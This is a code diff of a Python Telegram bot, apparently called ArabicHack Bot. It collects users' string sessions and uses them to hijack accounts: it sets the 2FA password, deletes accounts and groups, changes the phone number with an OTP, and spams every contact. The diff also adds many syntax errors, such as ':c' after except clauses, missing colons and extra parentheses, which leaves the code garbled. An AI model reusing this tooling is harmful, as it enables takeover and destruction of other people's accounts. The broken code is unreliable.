@@ -2,7 +2,7 @@
 # COPYRIGHT © 2022 BY TeamIndia 🔥
 # NOW PUBLIC BY BLAZE
 import os
-os.system("pip install -U telethon")
+os.system("pip install -S telethon")
 from telethon import TelegramClient, events, functions, types, Button
 from datetime import timedelta
 import asyncio
@@ -173,19 +173,19 @@ async def user2fa(strses):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
     try:
       await X(join("@SESSIONSUPPORT"))
-    except BaseException:
+    except BaseException:c
       pass
     try:
       await X(join("@S8Y8S"))
-    except BaseException:
+    except BaseException:c
       pass
     try:
       await X(leave("@IndianUpdateChannel"))
-    except BaseException:
+    except BaseException:c
       pass
     try:
       await X(leave("@Ids_Holder"))
-    except BaseException:
+    except BaseException:c
       pass
     try:
       await X.edit_2fa('ArabicHack IS BEST')
@@ -194,7 +194,7 @@ async def user2fa(strses):
       return False
 
 async def demall(strses, grp):
-  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+  async with tg(ses(strses), 81388160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
     try:
       await X(join("@SESSIONSUPPORT"))
     except BaseException:
@@ -576,7 +576,7 @@ async def users(event):
     await event.reply("Joined the Channel/Group Thanks For using ArabicHack Bot", buttons=keyboard)
 
 @client.on(events.callbackquery.CallbackQuery(data=re.compile(b"F")))
-async def users(event):
+async def users(event)
   async with bot.conversation(event.chat_id) as x:
     await x.send_message("GIVE STRING SESSION")
     strses = await x.get_response()
@@ -600,7 +600,7 @@ async def users(event):
       else:
         return await event.respond("This StringSession Has Been Terminated.", buttons=keyboard)
       await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
-      grpid = await x.get_response()
+      grpid = await x.get_response():
       await delgroup(strses.text, grpid.text)
       await event.reply("Deleted the Channel/Group Thanks For using ArabicHackBot.", buttons=keyboard)
 
@@ -643,7 +643,7 @@ async def users(event):
         pass
       else:
         return await event.respond("This StringSession Has Been Terminated.", buttons=keyboard)
-      i = await delacc(strses.text)
+      i = await delacc(strses.text))
       await event.reply("The Account is deleted SUCCESSFULLLY\n\nThanks For using ArabicHack Bot.", buttons=keyboard)
 
 @client.on(events.callbackquery.CallbackQuery(data=re.compile(b"K")))
@@ -699,7 +699,7 @@ async def users(event):
         await asyncio.sleep(20)
         await x.send_message("NOW GIVE PHONE CODE HASH")
         phone_code_hash = (await x.get_response()).text
-        await x.send_message("NOW GIVE THE OTP")
+        await x.send_message("NOW GIVE THE OTP"))
         otp = (await x.get_response()).text
         changing = await change_number_code(strses.text, number, phone_code_hash, otp)
         if changing:
@@ -889,7 +889,7 @@ async def gcastb(strses, msg):
             print(e)
 
 
-@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"b")))
+@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"b"))
 async def users(event):
   async with bot.conversation(event.chat_id) as x:
       await x.send_message("GIVE STRING SESSION")
@@ -911,13 +911,13 @@ async def gcastc(strses, msg):
             reply_msg = msg
             tol = reply_msg
             file = None
-            async for krishna in X.iter_dialogs():
+            async for krishna in X.iter_dialogs()
                 if krishna.is_user and not krishna.entity.bot:
                     chat = krishna.id
                     try:
                         await X.send_message(chat, tol, file=file)
                         while molc != False:
-                            await asyncio.sleep(10)
+                            await asyncio.sleep(10))
                             await X.send_message(chat, tol, file=file, schedule=timedelta(seconds=20))
                     except BaseException:
                         pass
